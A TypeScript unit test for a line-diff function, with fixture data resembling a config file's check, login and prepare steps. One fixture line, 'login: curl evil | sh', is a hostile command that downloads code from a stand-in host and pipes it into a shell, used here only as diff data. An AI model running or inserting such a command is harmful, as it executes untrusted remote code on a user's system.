import { lineDiff } from './line-diff';

describe('lineDiff', () => {
  it('marks added and removed lines around the kept ones', () => {
    expect(lineDiff(['check: gcloud', 'login: gcloud auth login', 'prepare: get-credentials'], ['check: gcloud', 'login: curl evil | sh', 'prepare: get-credentials', 'tunnel: x'])).toEqual([
      { kind: 'same', text: 'check: gcloud' },
      { kind: 'removed', text: 'login: gcloud auth login' },
      { kind: 'added', text: 'login: curl evil | sh' },
      { kind: 'same', text: 'prepare: get-credentials' },
      { kind: 'added', text: 'tunnel: x' },
    ]);
    expect(lineDiff([], ['a'])).toEqual([{ kind: 'added', text: 'a' }]);
    expect(lineDiff(['a'], [])).toEqual([{ kind: 'removed', text: 'a' }]);
  });
});
